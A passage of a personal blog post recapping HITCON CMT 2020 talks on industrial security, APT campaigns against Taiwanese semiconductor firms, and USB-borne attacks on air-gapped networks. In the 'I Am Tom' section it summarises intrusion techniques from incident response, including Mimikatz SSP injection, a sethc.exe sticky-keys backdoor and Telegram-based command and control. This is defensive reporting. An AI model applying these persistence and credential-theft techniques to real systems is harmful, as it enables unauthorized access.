    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/ddf884bdd04cefb263eca5bd8412c619b029a28f7ace02680ecc89d5fc308a80-400-3b62112a6.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/ddf884bdd04cefb263eca5bd8412c619b029a28f7ace02680ecc89d5fc308a80-600-3b62112a6.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/ddf884bdd04cefb263eca5bd8412c619b029a28f7ace02680ecc89d5fc308a80-800-3b62112a6.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/ddf884bdd04cefb263eca5bd8412c619b029a28f7ace02680ecc89d5fc308a80-1000-3b62112a6.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/ddf884bdd04cefb263eca5bd8412c619b029a28f7ace02680ecc89d5fc308a80-800-3b62112a6.png" width="1583" height="678" />
  </picture>
</a>

  <figcaption>Click to see the full agenda.</figcaption>
</figure>

<h3 id="2020-industrial-cybersecurity-landscape-ics--infosec">2020 Industrial Cybersecurity Landscape (ICS &amp; Infosec)</h3>

<p>After the opening, the rising importance of OT (<em>Operational Technology</em>, as opposed to IT - <em>Information Technology</em>) security was made apparent with the first talk of the day - “Industrial Cybersecurity Landscape in 2020: Trends, Challenges, and Opportunities.” Various APT groups have been preying on Taiwan in the past few years, and the OT industry is perhaps the biggest target of all, <a href="https://www.2-spyware.com/the-tsmc-appears-to-be-hacked-by-a-version-of-wannacry-ransomware">as TSMC was attacked by WannaCry in 2018</a>. In fact, the entire semiconductor industry has been under continuous attack even outside of the OT environment, as evidenced by the <a href="https://www.zdnet.com/article/black-hat-hackers-are-now-using-cobalt-strike-and-skeleton-keys-to-target-semiconductor-firms/">Black Hat 2020 APT Chimera report by CyCraft</a>.</p>

<figure class="third">
  <a href="/assets/images/posts/hitcon-cmt-2020/58e0f898774e10516a83bbc2eb5029068c3331982ad76d6cfadbe6db75eac65f.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/58e0f898774e10516a83bbc2eb5029068c3331982ad76d6cfadbe6db75eac65f-400-e31a65d75.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/58e0f898774e10516a83bbc2eb5029068c3331982ad76d6cfadbe6db75eac65f-600-e31a65d75.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/58e0f898774e10516a83bbc2eb5029068c3331982ad76d6cfadbe6db75eac65f-800-e31a65d75.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/58e0f898774e10516a83bbc2eb5029068c3331982ad76d6cfadbe6db75eac65f-1000-e31a65d75.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/58e0f898774e10516a83bbc2eb5029068c3331982ad76d6cfadbe6db75eac65f-400-5cea24212.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/58e0f898774e10516a83bbc2eb5029068c3331982ad76d6cfadbe6db75eac65f-600-5cea24212.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/58e0f898774e10516a83bbc2eb5029068c3331982ad76d6cfadbe6db75eac65f-800-5cea24212.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/58e0f898774e10516a83bbc2eb5029068c3331982ad76d6cfadbe6db75eac65f-1000-5cea24212.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/58e0f898774e10516a83bbc2eb5029068c3331982ad76d6cfadbe6db75eac65f-800-5cea24212.jpg" width="3024" height="3024" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/34ed080a07d1d2041c7a5551c00953ee72cc545fd4acb4a1fec76b32c33dab9b.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/34ed080a07d1d2041c7a5551c00953ee72cc545fd4acb4a1fec76b32c33dab9b-400-d75522c2b.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/34ed080a07d1d2041c7a5551c00953ee72cc545fd4acb4a1fec76b32c33dab9b-600-d75522c2b.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/34ed080a07d1d2041c7a5551c00953ee72cc545fd4acb4a1fec76b32c33dab9b-800-d75522c2b.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/34ed080a07d1d2041c7a5551c00953ee72cc545fd4acb4a1fec76b32c33dab9b-1000-d75522c2b.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/34ed080a07d1d2041c7a5551c00953ee72cc545fd4acb4a1fec76b32c33dab9b-400-eac926560.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/34ed080a07d1d2041c7a5551c00953ee72cc545fd4acb4a1fec76b32c33dab9b-600-eac926560.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/34ed080a07d1d2041c7a5551c00953ee72cc545fd4acb4a1fec76b32c33dab9b-800-eac926560.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/34ed080a07d1d2041c7a5551c00953ee72cc545fd4acb4a1fec76b32c33dab9b-1000-eac926560.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/34ed080a07d1d2041c7a5551c00953ee72cc545fd4acb4a1fec76b32c33dab9b-800-eac926560.jpg" width="3024" height="3024" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/0fc58c1195850469ee0214d072dbe539c35962aa337f7f8708a5e03e5ffeb6c9.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/0fc58c1195850469ee0214d072dbe539c35962aa337f7f8708a5e03e5ffeb6c9-400-5e7a96a81.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/0fc58c1195850469ee0214d072dbe539c35962aa337f7f8708a5e03e5ffeb6c9-600-5e7a96a81.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/0fc58c1195850469ee0214d072dbe539c35962aa337f7f8708a5e03e5ffeb6c9-800-5e7a96a81.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/0fc58c1195850469ee0214d072dbe539c35962aa337f7f8708a5e03e5ffeb6c9-1000-5e7a96a81.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/0fc58c1195850469ee0214d072dbe539c35962aa337f7f8708a5e03e5ffeb6c9-400-23fc7838d.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/0fc58c1195850469ee0214d072dbe539c35962aa337f7f8708a5e03e5ffeb6c9-600-23fc7838d.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/0fc58c1195850469ee0214d072dbe539c35962aa337f7f8708a5e03e5ffeb6c9-800-23fc7838d.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/0fc58c1195850469ee0214d072dbe539c35962aa337f7f8708a5e03e5ffeb6c9-1000-23fc7838d.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/0fc58c1195850469ee0214d072dbe539c35962aa337f7f8708a5e03e5ffeb6c9-800-23fc7838d.jpg" width="3024" height="3024" />
  </picture>
</a>

  <figcaption>The future is looking gloomy if we don't invest more in OT security.</figcaption>
</figure>

<h3 id="lunch-break-intermissions">Lunch Break (Intermissions!)</h3>

<p>I skipped over the next period of talks as I didn’t find anything particularly interesting that I wanted to listen to - which was rare. Alas, I went to work on my slides for my Lightning Talk session (I’ll get to that later). As always, the included meals and bonuses that came with the conference were amazing to have. This would be a fantastic chance for non-Taiwanese visitors to try out bentos.</p>

<p><a href="/assets/images/posts/hitcon-cmt-2020/f8c0999a31c7ee95c98b62887aae111c19b72c0329e5733b08c6559bf0f20390.jpg"><picture><source srcset="/generated/assets/images/posts/hitcon-cmt-2020/f8c0999a31c7ee95c98b62887aae111c19b72c0329e5733b08c6559bf0f20390-400-932831765.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/f8c0999a31c7ee95c98b62887aae111c19b72c0329e5733b08c6559bf0f20390-600-932831765.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/f8c0999a31c7ee95c98b62887aae111c19b72c0329e5733b08c6559bf0f20390-800-932831765.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/f8c0999a31c7ee95c98b62887aae111c19b72c0329e5733b08c6559bf0f20390-1000-932831765.webp 1000w" type="image/webp"><source srcset="/generated/assets/images/posts/hitcon-cmt-2020/f8c0999a31c7ee95c98b62887aae111c19b72c0329e5733b08c6559bf0f20390-400-92ae2b59d.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/f8c0999a31c7ee95c98b62887aae111c19b72c0329e5733b08c6559bf0f20390-600-92ae2b59d.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/f8c0999a31c7ee95c98b62887aae111c19b72c0329e5733b08c6559bf0f20390-800-92ae2b59d.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/f8c0999a31c7ee95c98b62887aae111c19b72c0329e5733b08c6559bf0f20390-1000-92ae2b59d.jpg 1000w" type="image/jpeg"><img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/f8c0999a31c7ee95c98b62887aae111c19b72c0329e5733b08c6559bf0f20390-800-92ae2b59d.jpg" width="4032" height="2268"></picture></a></p>

<p>Under normal circumstances, I would have preferred to listen to the “APT Chimera - Operation targets Semiconductor Vendors” talk after the lunch break; fortunately, though, I had the chance to listen to the Dr. Bletchley’s excellent talk during this year’s AIS3 summer school. For those curious, you can find <a href="https://i.blackhat.com/USA-20/Thursday/us-20-Chen-Operation-Chimera-APT-Operation-Targets-Semiconductor-Vendors.pdf">the slides on Black Hat’s website</a>, as this talk was also shown off at this year’s Black Hat.</p>

<figure class="third">
  <a href="/assets/images/posts/hitcon-cmt-2020/0A8E60F44266496AA318161AC5139D4CAF06DFD68445D227ADC7F9F3A61F995F.png">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/0A8E60F44266496AA318161AC5139D4CAF06DFD68445D227ADC7F9F3A61F995F-400-88c8d841b.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/0A8E60F44266496AA318161AC5139D4CAF06DFD68445D227ADC7F9F3A61F995F-600-88c8d841b.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/0A8E60F44266496AA318161AC5139D4CAF06DFD68445D227ADC7F9F3A61F995F-800-88c8d841b.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/0A8E60F44266496AA318161AC5139D4CAF06DFD68445D227ADC7F9F3A61F995F-1000-88c8d841b.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/0A8E60F44266496AA318161AC5139D4CAF06DFD68445D227ADC7F9F3A61F995F-400-246a4b6eb.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/0A8E60F44266496AA318161AC5139D4CAF06DFD68445D227ADC7F9F3A61F995F-600-246a4b6eb.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/0A8E60F44266496AA318161AC5139D4CAF06DFD68445D227ADC7F9F3A61F995F-800-246a4b6eb.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/0A8E60F44266496AA318161AC5139D4CAF06DFD68445D227ADC7F9F3A61F995F-1000-246a4b6eb.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/0A8E60F44266496AA318161AC5139D4CAF06DFD68445D227ADC7F9F3A61F995F-800-246a4b6eb.png" width="1907" height="1073" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/989F104A91CD73611FDA5CB200C3B20D57C79023FE0ACF5C700CF446C7D5CC5A.png">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/989F104A91CD73611FDA5CB200C3B20D57C79023FE0ACF5C700CF446C7D5CC5A-400-32d116ff5.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/989F104A91CD73611FDA5CB200C3B20D57C79023FE0ACF5C700CF446C7D5CC5A-600-32d116ff5.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/989F104A91CD73611FDA5CB200C3B20D57C79023FE0ACF5C700CF446C7D5CC5A-800-32d116ff5.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/989F104A91CD73611FDA5CB200C3B20D57C79023FE0ACF5C700CF446C7D5CC5A-1000-32d116ff5.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/989F104A91CD73611FDA5CB200C3B20D57C79023FE0ACF5C700CF446C7D5CC5A-400-4a42306cb.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/989F104A91CD73611FDA5CB200C3B20D57C79023FE0ACF5C700CF446C7D5CC5A-600-4a42306cb.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/989F104A91CD73611FDA5CB200C3B20D57C79023FE0ACF5C700CF446C7D5CC5A-800-4a42306cb.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/989F104A91CD73611FDA5CB200C3B20D57C79023FE0ACF5C700CF446C7D5CC5A-1000-4a42306cb.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/989F104A91CD73611FDA5CB200C3B20D57C79023FE0ACF5C700CF446C7D5CC5A-800-4a42306cb.png" width="2000" height="1125" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/B642A8F673DEE836D3738D0EFB4D86819751A7D1BD2CE61E8A7EE93A7064E178.png">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/B642A8F673DEE836D3738D0EFB4D86819751A7D1BD2CE61E8A7EE93A7064E178-400-df71c8823.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/B642A8F673DEE836D3738D0EFB4D86819751A7D1BD2CE61E8A7EE93A7064E178-600-df71c8823.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/B642A8F673DEE836D3738D0EFB4D86819751A7D1BD2CE61E8A7EE93A7064E178-800-df71c8823.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/B642A8F673DEE836D3738D0EFB4D86819751A7D1BD2CE61E8A7EE93A7064E178-1000-df71c8823.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/B642A8F673DEE836D3738D0EFB4D86819751A7D1BD2CE61E8A7EE93A7064E178-400-a7e7912e4.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/B642A8F673DEE836D3738D0EFB4D86819751A7D1BD2CE61E8A7EE93A7064E178-600-a7e7912e4.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/B642A8F673DEE836D3738D0EFB4D86819751A7D1BD2CE61E8A7EE93A7064E178-800-a7e7912e4.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/B642A8F673DEE836D3738D0EFB4D86819751A7D1BD2CE61E8A7EE93A7064E178-1000-a7e7912e4.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/B642A8F673DEE836D3738D0EFB4D86819751A7D1BD2CE61E8A7EE93A7064E178-800-a7e7912e4.png" width="2000" height="1125" />
  </picture>
</a>
  
  <figcaption>CyCraft's astounding report on the semiconductor attacks by Chinese APT in the recent years in Taiwan.</figcaption>
</figure>

<p>Anyways, what I ended up doing was tuning in to the “company recruitment” segment, where sponsors do their sponsored segments and advertise their company in the hope of getting new blood. As mentioned in the prologue, 2020 is a turning point for everyone - the entire infosec industry, Taiwan, every country that suffered from COVID-19, and me.</p>

<p>Why me? Because I’ve been on the lookout for a job myself as well. Not just any job, but a job that I can find myself enjoying in. Over the past few years, I’ve decided that the best type of job for me would be becoming a Security Researcher, joining a Red Team of sorts, or doing forensics-related work. In other words, I’ve been hoping to find companies that offer this type of job opportunity. Several companies did peak my interest, CyCraft, TeamT5, Panasonic Cybersecurity Lab, and several more. Getting a job may not sound like that big of a deal, but for me to get any jobs like that would require me to move to Taipei, the capital of the country. Where I’m from is very different from the bustling life of metropolis, which is why I’m kinda anxious about the future as well. I’ll make an updated rambling if I do manage to land a job, though.</p>

<figure class="third">
  <a href="/assets/images/posts/hitcon-cmt-2020/9de499b527bb9b010ecd7782765f614f37d9617e7819da88076bf0f1aa04fd5f.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/9de499b527bb9b010ecd7782765f614f37d9617e7819da88076bf0f1aa04fd5f-400-011b4b17a.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/9de499b527bb9b010ecd7782765f614f37d9617e7819da88076bf0f1aa04fd5f-600-011b4b17a.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/9de499b527bb9b010ecd7782765f614f37d9617e7819da88076bf0f1aa04fd5f-800-011b4b17a.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/9de499b527bb9b010ecd7782765f614f37d9617e7819da88076bf0f1aa04fd5f-1000-011b4b17a.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/9de499b527bb9b010ecd7782765f614f37d9617e7819da88076bf0f1aa04fd5f-400-7701bca8c.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/9de499b527bb9b010ecd7782765f614f37d9617e7819da88076bf0f1aa04fd5f-600-7701bca8c.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/9de499b527bb9b010ecd7782765f614f37d9617e7819da88076bf0f1aa04fd5f-800-7701bca8c.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/9de499b527bb9b010ecd7782765f614f37d9617e7819da88076bf0f1aa04fd5f-1000-7701bca8c.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/9de499b527bb9b010ecd7782765f614f37d9617e7819da88076bf0f1aa04fd5f-800-7701bca8c.jpg" width="4032" height="3024" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/5195f0903c4ac9759a000dd7dd4d538953f1910c24c6cb25a33e8263c0ca7e10.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/5195f0903c4ac9759a000dd7dd4d538953f1910c24c6cb25a33e8263c0ca7e10-400-c36c86d44.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/5195f0903c4ac9759a000dd7dd4d538953f1910c24c6cb25a33e8263c0ca7e10-600-c36c86d44.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/5195f0903c4ac9759a000dd7dd4d538953f1910c24c6cb25a33e8263c0ca7e10-800-c36c86d44.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/5195f0903c4ac9759a000dd7dd4d538953f1910c24c6cb25a33e8263c0ca7e10-1000-c36c86d44.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/5195f0903c4ac9759a000dd7dd4d538953f1910c24c6cb25a33e8263c0ca7e10-400-df61e9fe5.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/5195f0903c4ac9759a000dd7dd4d538953f1910c24c6cb25a33e8263c0ca7e10-600-df61e9fe5.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/5195f0903c4ac9759a000dd7dd4d538953f1910c24c6cb25a33e8263c0ca7e10-800-df61e9fe5.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/5195f0903c4ac9759a000dd7dd4d538953f1910c24c6cb25a33e8263c0ca7e10-1000-df61e9fe5.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/5195f0903c4ac9759a000dd7dd4d538953f1910c24c6cb25a33e8263c0ca7e10-800-df61e9fe5.jpg" width="4032" height="3024" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/4c6bf7fbe1c47126379c73918c3668346f332dbaf5a3996e3f48412fef1a9bcd.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/4c6bf7fbe1c47126379c73918c3668346f332dbaf5a3996e3f48412fef1a9bcd-400-bff5b1e21.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/4c6bf7fbe1c47126379c73918c3668346f332dbaf5a3996e3f48412fef1a9bcd-600-bff5b1e21.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/4c6bf7fbe1c47126379c73918c3668346f332dbaf5a3996e3f48412fef1a9bcd-800-bff5b1e21.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/4c6bf7fbe1c47126379c73918c3668346f332dbaf5a3996e3f48412fef1a9bcd-1000-bff5b1e21.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/4c6bf7fbe1c47126379c73918c3668346f332dbaf5a3996e3f48412fef1a9bcd-400-78a32dbcf.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/4c6bf7fbe1c47126379c73918c3668346f332dbaf5a3996e3f48412fef1a9bcd-600-78a32dbcf.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/4c6bf7fbe1c47126379c73918c3668346f332dbaf5a3996e3f48412fef1a9bcd-800-78a32dbcf.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/4c6bf7fbe1c47126379c73918c3668346f332dbaf5a3996e3f48412fef1a9bcd-1000-78a32dbcf.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/4c6bf7fbe1c47126379c73918c3668346f332dbaf5a3996e3f48412fef1a9bcd-800-78a32dbcf.jpg" width="4032" height="3024" />
  </picture>
</a>

  <figcaption>Everyone's favorite segment - sponsors!</figcaption>
</figure>

<h3 id="operation-i-am-tom-ad-infiltration">Operation: I Am Tom (AD Infiltration)</h3>

<p>The next segment I chose to tune in to was “Operation: I Am Tom,” a talk focusing on various attack vectors and methods <a href="https://teamt5.org/en/">TeamT5</a> had encountered when handling incident responses. Unfortunately, this session was marked as “On-site Only,” which means I’m not allowed to show off any of the slides featured in the talk. What I am allowed to do, though, is talk about some of the exciting highlights from the session.</p>

<ul>
  <li>The hosts mentioned the reason why the section was named “I Am Tom” was because while dealing with one of the incident response cases, the threat actor noticed the presence of SecOp and decided to drop a file called <code class="language-plaintext highlighter-rouge">iamtom.txt</code> under the root directory.
    <ul>
      <li>This shows that these threat actors are not only not afraid of these security researchers but would even dare fight back on the spot.</li>
    </ul>
  </li>
  <li>Threat actors will try whatever possible to run Mimikatz on the victim server
    <ul>
      <li>Those who had dealt with Windows Server red teaming should need no introduction to Mimikatz. It is an open-source software used to dump NTLM keys. Threat actors love to use Mimikatz in order to move laterally within the victim organization.</li>
      <li>The researchers noted the use of injection of <code class="language-plaintext highlighter-rouge">mimilib.dll</code>, a library that Mimikatz uses, into the Security Support Provider. If you are interested, XPN has an excellent article on this subject matter over at <a href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">Exploring Mimikatz - Part 2 - SSP</a>.</li>
    </ul>
  </li>
  <li>Use of genuine third-party software is not uncommon
    <ul>
      <li>In one of the cases, the attacker used a software called “Easy File Locker,” which was a genuine piece of software used to hide user’s files. The threat actor used the software to hide itself from SecOps.</li>
      <li>While this type of attack method is rather uncommon, as these threat actors would typically embed such functionality in their malware instead of relying on an external program, this example shows that it can still happen.</li>
    </ul>
  </li>
  <li>Use of old-tricks are still fairly common even when dealing with APTs
    <ul>
      <li>In this case, the researchers noted that some threat actors had sneakily replaced <code class="language-plaintext highlighter-rouge">sethc.exe</code> (Accessibility Shortcut Keys) with <code class="language-plaintext highlighter-rouge">cmd.exe</code>. By replacing the executable, the threat actor can then launch <code class="language-plaintext highlighter-rouge">cmd.exe</code> by invoking the sticky keys (pressing <code class="language-plaintext highlighter-rouge">Shift</code> 5 times).</li>
    </ul>
  </li>
  <li>Use of Telegram API as RAT
    <ul>
      <li>To create inconspicuous traffic, threat actors may use third-party IM APIs in order to communicate with the C2 station. In this instance, the threat actor chose to use Telegram as their C2 endpoint.</li>
      <li>The threat actor may use Telegram to send pre-determined commands to victim machines, and the victim machines would return the results in the same Telegram channel.</li>
      <li>While the use of inconspicuous traffic as C2 stations <a href="https://www.secureworks.com/blog/twitter-based-botnet-command-and-control">is nothing new</a>, this incident still shows that this trick is still actively being used to this day.</li>
    </ul>
  </li>
</ul>

<p>Many more topics were presented in this talk, but the above were the ones I found the most interesting.</p>

<p><a href="/assets/images/posts/hitcon-cmt-2020/58e659b13c6516eaa977bc34c55d8d79ff9f678f47ae48756966f481a9780f8b.png"><picture><source srcset="/generated/assets/images/posts/hitcon-cmt-2020/58e659b13c6516eaa977bc34c55d8d79ff9f678f47ae48756966f481a9780f8b-400-cc1baff20.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/58e659b13c6516eaa977bc34c55d8d79ff9f678f47ae48756966f481a9780f8b-600-cc1baff20.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/58e659b13c6516eaa977bc34c55d8d79ff9f678f47ae48756966f481a9780f8b-800-cc1baff20.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/58e659b13c6516eaa977bc34c55d8d79ff9f678f47ae48756966f481a9780f8b-1000-cc1baff20.webp 1000w" type="image/webp"><source srcset="/generated/assets/images/posts/hitcon-cmt-2020/58e659b13c6516eaa977bc34c55d8d79ff9f678f47ae48756966f481a9780f8b-400-1352ad2ed.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/58e659b13c6516eaa977bc34c55d8d79ff9f678f47ae48756966f481a9780f8b-600-1352ad2ed.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/58e659b13c6516eaa977bc34c55d8d79ff9f678f47ae48756966f481a9780f8b-800-1352ad2ed.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/58e659b13c6516eaa977bc34c55d8d79ff9f678f47ae48756966f481a9780f8b-1000-1352ad2ed.png 1000w" type="image/png"><img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/58e659b13c6516eaa977bc34c55d8d79ff9f678f47ae48756966f481a9780f8b-800-1352ad2ed.png" width="2400" height="1029"></picture></a></p>

<h3 id="tropic-troopers-usbferry-apt-vs-air-gapped-environments">Tropic Trooper’s USBFerry (APT vs. Air-gapped Environments)</h3>

<p>Next up was Trend Micro’s talk on the APT group, Tropic Trooper’s, attack among air-gapped systems (a detailed report is on Trend Micro’s blog - <a href="https://www.trendmicro.com/en_us/research/20/e/tropic-troopers-back-usbferry-attack-targets-air-gapped-environments.html">Tropic Trooper’s USBFerry Targets Air-Gapped Networks</a>).</p>

<p>This is one of the talks that I found the most fascinating. After all, breaking into a both physically-secured and technologically-secured environment is almost impossible - unless you are a very well-trained group of internet assassins, which honestly, sounds like what the APT group is like IRL.</p>

<p>A quick rundown of a physically isolated system is as such,</p>

<ul>
  <li>Usually disconnected from the public network
    <ul>
      <li>This means attacking over remote is almost out of the picture.</li>
    </ul>
  </li>
  <li>Rely on well-protected strategies for data exchange
    <ul>
      <li>e.g. biometric secured flash drives, using a quarantined machine to scan the device, air-gap switcher, etc.</li>
    </ul>
  </li>
</ul>

<p>To fight against this, the APT group used a type of attack they dubbed “Ferry,” which, in this case, means “to cross the shore by ship to another.” Essentially, the malware would have to travel from devices to devices via removable media (such as USB thumb drives, floppy disks, memory cards, etc.), all while hoping that the malware would not be detected by the AV on the middle-man scanning machine as previously mentioned.</p>

<p>According to the report, the threat actors infiltrated the group via the typical spear-phishing attack, with emails designed for military personnel (e.g., documents with specific weapon information, tanks, etc.). With this information in mind, it becomes apparent that the group behind the attack was most likely state-sponsored, as there’s no way your average Joe would have intelligence regarding weapon blue maps and such.</p>

<figure class="half">
  <a href="/assets/images/posts/hitcon-cmt-2020/34d42e37fcb7e8886213c0295714206ad16e464f8d7961fc84874c6ae74417b7.png">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/34d42e37fcb7e8886213c0295714206ad16e464f8d7961fc84874c6ae74417b7-400-77b68412e.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/34d42e37fcb7e8886213c0295714206ad16e464f8d7961fc84874c6ae74417b7-600-77b68412e.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/34d42e37fcb7e8886213c0295714206ad16e464f8d7961fc84874c6ae74417b7-800-77b68412e.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/34d42e37fcb7e8886213c0295714206ad16e464f8d7961fc84874c6ae74417b7-1000-77b68412e.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/34d42e37fcb7e8886213c0295714206ad16e464f8d7961fc84874c6ae74417b7-400-f3aa86433.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/34d42e37fcb7e8886213c0295714206ad16e464f8d7961fc84874c6ae74417b7-600-f3aa86433.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/34d42e37fcb7e8886213c0295714206ad16e464f8d7961fc84874c6ae74417b7-800-f3aa86433.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/34d42e37fcb7e8886213c0295714206ad16e464f8d7961fc84874c6ae74417b7-1000-f3aa86433.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/34d42e37fcb7e8886213c0295714206ad16e464f8d7961fc84874c6ae74417b7-800-f3aa86433.png" width="1325" height="745" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/800f967d9d7614eeecbea3ab1caac9c1d0c2612ccdf9c4f97796376f2e8a7ca3.png">
  <picture>
